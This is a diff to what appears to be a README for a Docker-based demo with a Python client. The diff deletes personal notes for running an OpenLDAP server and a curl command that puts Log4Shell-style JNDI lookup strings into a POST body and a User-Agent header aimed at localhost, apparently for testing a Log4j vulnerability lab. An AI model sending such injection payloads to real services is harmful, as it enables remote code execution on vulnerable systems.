@@ -16,14 +16,3 @@ When running in Docker, there is even a simple Grafana board available at http:/
 The Python client is based on version 3.9. Just run `python3 <filename.py>` from the `client` folder.
 
 
-
-how to configure openldap
-
-how to start openldap
-sudo /usr/libexec/slapd -d3
-
-ldapsearch -H ldap://localhost:389/test -x
-
-
-curl command
-curl -v -X POST http://localhost:8080/post -d '${jndi:ldap://my-domain:389/localhost}' -H 'User-Agent: ${jndi:ldap://localhost:389}'
